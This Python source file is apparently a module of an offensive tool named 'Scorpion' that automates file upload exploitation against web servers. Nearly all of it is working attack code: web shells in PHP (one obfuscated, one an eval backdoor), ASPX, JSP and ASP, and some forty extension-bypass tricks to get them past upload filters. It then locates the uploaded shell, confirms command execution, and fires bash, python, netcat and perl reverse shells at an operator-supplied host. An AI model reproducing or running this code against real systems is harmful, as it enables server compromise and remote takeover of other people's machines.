"""
Comprehensive File Upload Exploitation Module for Scorpion
Handles web shell uploads, RCE verification, and reverse shell triggering
"""

import asyncio
import aiohttp
import hashlib
from typing import List, Optional, Dict
from dataclasses import dataclass
from urllib.parse import urljoin, urlparse


@dataclass
class ExploitResult:
    """Result of file upload exploitation attempt"""
    success: bool
    shell_url: Optional[str] = None
    shell_type: Optional[str] = None
    access_command: Optional[str] = None
    evidence: Optional[str] = None
    error: Optional[str] = None


class FileUploadExploiter:
    """
    Comprehensive file upload exploitation class
    - Uploads web shells (PHP, ASPX, JSP, ASP)
    - Tests 40+ file extension bypasses
    - Verifies RCE with unique test strings
    - Triggers reverse shells
    """
    
    # Web shell payloads for different server technologies
    WEB_SHELLS = {
        "php": """<?php
if(isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>""",
        "php_obfuscated": """<?php
$a=base64_decode("c3lzdGVt");
if(isset($_GET['c'])) {
    echo "<pre>";
    $a($_GET['c']);
    echo "</pre>";
}
?>""",
        "php_eval": """<?php @eval($_POST['x']); ?>""",
        
        "aspx": """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request["cmd"];
    if(!string.IsNullOrEmpty(cmd)) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        p.WaitForExit();
    }
}
</script>""",
        
        "jsp": """<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        out.println("<pre>");
        while((line = br.readLine()) != null) {
            out.println(line);
        }
        out.println("</pre>");
    }
%>""",
        
        "asp": """<%
Dim cmd, result
cmd = Request.QueryString("cmd")
If cmd <> "" Then
    Set objShell = Server.CreateObject("WScript.Shell")
    Set objExec = objShell.Exec("cmd.exe /c " & cmd)
    result = objExec.StdOut.ReadAll()
    Response.Write("<pre>" & result & "</pre>")
End If
%>"""
    }
    
    # File extensions to try (40+ bypass techniques)
    EXTENSIONS = [
        # Standard extensions
        "php", "php3", "php4", "php5", "php7", "phtml", "phar",
        "aspx", "asp", "jsp", "jspx",
        
        # Double extensions
        "php.jpg", "php.png", "php.gif", "php.txt", "php.pdf",
        "aspx.jpg", "jsp.jpg",
        
        # Reverse double extensions
        "jpg.php", "png.php", "gif.php", "txt.php",
        
        # Null byte injection (may work on old servers)
        "php%00.jpg", "aspx%00.jpg", "jsp%00.jpg",
        
        # Case variation bypasses
        "PHP", "PhP", "pHp", "ASPX", "ASP", "JSP",
        
        # Alternative extensions
        "php2", "php6", "phps", "pht", "phtm", "pgif",
        "shtml", "shtm", "asa", "cer", "asax", "ashx", "asmx"
    ]
    
    # Common upload paths to check
    UPLOAD_PATHS = [
        "/uploads/", "/files/", "/media/", "/images/",
        "/upload/", "/file/", "/user_uploads/", "/attachments/",
        "/public/uploads/", "/static/uploads/", "/assets/uploads/",
        "/content/uploads/", "/data/uploads/", "/tmp/", "/temp/",
        "/user_files/", "/documents/", "/resources/"
    ]
    
    def __init__(self, timeout: int = 30):
        self.timeout = timeout
        import time
        self.test_string = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    
    async def exploit_file_upload(
        self,
        target: str,
        upload_endpoint: Optional[str] = None,
        form_field: str = "file",
        additional_fields: Optional[Dict[str, str]] = None,
        lhost: Optional[str] = None,
        lport: int = 4444
    ) -> List[ExploitResult]:
        """
        Main exploitation method
        
        Args:
            target: Base target URL (e.g., http://192.168.70.6:8080)
            upload_endpoint: Known upload endpoint (e.g., /index.php/upload)
            form_field: Name of file upload field (default: "file")
            additional_fields: Additional form fields required
            lhost: Local host for reverse shell
            lport: Local port for reverse shell
            
        Returns:
            List of ExploitResult objects
        """
        results = []
        
        # If no upload endpoint provided, try to discover one
        if not upload_endpoint:
            print(f"  [*] No upload endpoint specified, attempting discovery...")
            upload_endpoint = await self._discover_upload_endpoints(target)
            if not upload_endpoint:
                return [ExploitResult(
                    success=False,
                    error="No upload endpoint found or specified"
                )]
        
        # Full upload URL
        upload_url = urljoin(target, upload_endpoint)
        print(f"  [*] Targeting upload endpoint: {upload_url}")
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            connector=aiohttp.TCPConnector(ssl=False)
        ) as session:
            # Try different shell types
            for shell_type in ["php", "php_obfuscated", "aspx", "jsp"]:
                shell_code = self.WEB_SHELLS.get(shell_type)
                if not shell_code:
                    continue
                
                # Try different file extensions
                for ext in self.EXTENSIONS:
                    # Skip mismatched types (e.g., PHP shell with ASPX extension)
                    if shell_type.startswith("php") and ext.lower() not in ["php", "php3", "php4", "php5", "php7", "phtml", "phar", "php.jpg", "jpg.php", "php%00.jpg", "php2", "php6", "phps", "pht", "phtm", "pgif", "shtml"]:
                        continue
                    if shell_type == "aspx" and not ext.lower().startswith("asp"):
                        continue
                    if shell_type == "jsp" and not ext.lower().startswith("jsp"):
                        continue
                    
                    result = await self._upload_shell(
                        session, upload_url, shell_type, ext,
                        form_field, additional_fields
                    )
                    
                    if result.success:
                        print(f"  [✅] SUCCESS! Shell uploaded: {result.shell_url}")
                        results.append(result)
                        
                        # Try reverse shell if lhost provided
                        if lhost:
                            await self._trigger_reverse_shell(session, result, lhost, lport)
                        
                        # Stop after first successful upload (can be changed)
                        return results
        
        if not results:
            return [ExploitResult(
                success=False,
                error="Failed to upload shell with any technique"
            )]
        
        return results
    
    async def _discover_upload_endpoints(self, target: str) -> Optional[str]:
        """
        Try to discover upload endpoints by checking common patterns
        """
        common_patterns = [
            "/upload", "/upload.php", "/upload.aspx", "/upload.jsp",
            "/file/upload", "/files/upload", "/media/upload",
            "/index.php/upload", "/admin/upload", "/user/upload",
            "/api/upload", "/v1/upload", "/upload/file",
            "/fileupload", "/uploadfile", "/uploadfiles"
        ]
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=5),
            connector=aiohttp.TCPConnector(ssl=False)
        ) as session:
            for pattern in common_patterns:
                url = urljoin(target, pattern)
                try:
                    async with session.get(url) as resp:
                        if resp.status in [200, 201, 405]:  # 405 means POST might work
                            print(f"  [*] Found potential upload endpoint: {pattern}")
                            return pattern
                except:
                    continue
        
        return None
    
    async def _upload_shell(
        self,
        session: aiohttp.ClientSession,
        upload_url: str,
        shell_type: str,
        extension: str,
        form_field: str,
        additional_fields: Optional[Dict[str, str]]
    ) -> ExploitResult:
        """
        Attempt to upload a web shell with specific extension
        """
        shell_code = self.WEB_SHELLS[shell_type]
        filename = f"shell_{self.test_string}.{extension}"
        
        # Determine content type (try to mimic images for evasion)
        if "jpg" in extension or "jpeg" in extension:
            content_type = "image/jpeg"
        elif "png" in extension:
            content_type = "image/png"
        elif "gif" in extension:
            content_type = "image/gif"
        else:
            content_type = "application/octet-stream"
        
        try:
            # Build multipart form data
            data = aiohttp.FormData()
            data.add_field(
                form_field,
                shell_code,
                filename=filename,
                content_type=content_type
            )
            
            # Add additional fields if provided
            if additional_fields:
                for key, value in additional_fields.items():
                    data.add_field(key, value)
            
            # Attempt upload
            async with session.post(upload_url, data=data) as resp:
                response_text = await resp.text()
                
                if resp.status in [200, 201, 202]:
                    # Try to find uploaded file
                    shell_url = await self._find_uploaded_file(
                        session, upload_url, filename
                    )
                    
                    if shell_url:
                        # Verify RCE
                        if await self._verify_rce(session, shell_url, shell_type):
                            access_cmd = f"curl '{shell_url}?cmd=whoami'" if shell_type.startswith("php") else f"curl '{shell_url}?cmd=whoami'"
                            return ExploitResult(
                                success=True,
                                shell_url=shell_url,
                                shell_type=shell_type,
                                access_command=access_cmd,
                                evidence=f"RCE verified with test string: {self.test_string}"
                            )
        
        except Exception as e:
            pass
        
        return ExploitResult(success=False)
    
    async def _find_uploaded_file(
        self,
        session: aiohttp.ClientSession,
        upload_url: str,
        filename: str
    ) -> Optional[str]:
        """
        Try to locate the uploaded file in common paths
        """
        parsed = urlparse(upload_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Check all common upload paths
        for path in self.UPLOAD_PATHS:
            test_url = urljoin(base_url, f"{path}{filename}")
            try:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                    if resp.status == 200:
                        print(f"  [*] Found uploaded file at: {test_url}")
                        return test_url
            except:
                continue
        
        # Try relative to upload endpoint
        upload_dir = "/".join(parsed.path.split("/")[:-1]) + "/"
        test_url = urljoin(base_url, f"{upload_dir}{filename}")
        try:
            async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                if resp.status == 200:
                    return test_url
        except:
            pass
        
        return None
    
    async def _verify_rce(
        self,
        session: aiohttp.ClientSession,
        shell_url: str,
        shell_type: str
    ) -> bool:
        """
        Verify remote code execution by running test commands
        """
        # Test commands that output unique string
        test_commands = [
            f"echo {self.test_string}",
            f"print('{self.test_string}')",
            f"Write-Output '{self.test_string}'",
            f"Response.Write('{self.test_string}')"
        ]
        
        for cmd in test_commands:
            try:
                # PHP shells typically use ?cmd= parameter
                if shell_type.startswith("php"):
                    test_url = f"{shell_url}?cmd={cmd}"
                else:
                    test_url = f"{shell_url}?cmd={cmd}"
                
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    response_text = await resp.text()
                    if self.test_string in response_text:
                        print(f"  [✅] RCE verified! Test string found in response")
                        return True
            except:
                continue
        
        return False
    
    async def _trigger_reverse_shell(
        self,
        session: aiohttp.ClientSession,
        upload_result: ExploitResult,
        lhost: str,
        lport: int
    ):
        """
        Attempt to trigger a reverse shell using the uploaded web shell
        """
        print(f"  [*] Attempting to trigger reverse shell to {lhost}:{lport}")
        print(f"  [!] Start listener: nc -lvnp {lport}")
        
        # Reverse shell payloads
        rev_shells = [
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
            f"nc -e /bin/sh {lhost} {lport}",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        ]
        
        for payload in rev_shells:
            try:
                shell_url = upload_result.shell_url
                if upload_result.shell_type and upload_result.shell_type.startswith("php"):
                    trigger_url = f"{shell_url}?cmd={payload}"
                else:
                    trigger_url = f"{shell_url}?cmd={payload}"
                
                # Fire and forget (reverse shell won't return)
                asyncio.create_task(session.get(
                    trigger_url,
                    timeout=aiohttp.ClientTimeout(total=2)
                ))
                await asyncio.sleep(1)
            except:
                pass


async def run_file_upload_exploit(
    target: str,
    upload_endpoint: Optional[str] = None,
    lhost: Optional[str] = None,
    lport: int = 4444
) -> List[ExploitResult]:
    """
    Wrapper function for easy integration
    
    Example usage:
        results = await run_file_upload_exploit(
            target="http://192.168.70.6:8080",
            upload_endpoint="/index.php/upload",
            lhost="192.168.70.1",
            lport=4444
        )
    """
    exploiter = FileUploadExploiter()
    return await exploiter.exploit_file_upload(
        target=target,
        upload_endpoint=upload_endpoint,
        lhost=lhost,
        lport=lport
    )


if __name__ == "__main__":
    # Test the module
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python file_upload_exploit.py <target_url> [upload_endpoint] [lhost] [lport]")
        sys.exit(1)
    
    target_url = sys.argv[1]
    endpoint = sys.argv[2] if len(sys.argv) > 2 else None
    lhost = sys.argv[3] if len(sys.argv) > 3 else None
    lport = int(sys.argv[4]) if len(sys.argv) > 4 else 4444
    
    async def main():
        print(f"[*] Starting file upload exploitation on {target_url}")
        results = await run_file_upload_exploit(target_url, endpoint, lhost, lport)
        
        print("\n[*] Results:")
        for i, result in enumerate(results, 1):
            print(f"\nResult {i}:")
            print(f"  Success: {result.success}")
            if result.success:
                print(f"  Shell URL: {result.shell_url}")
                print(f"  Shell Type: {result.shell_type}")
                print(f"  Access: {result.access_command}")
                print(f"  Evidence: {result.evidence}")
            else:
                print(f"  Error: {result.error}")
    
    asyncio.run(main())
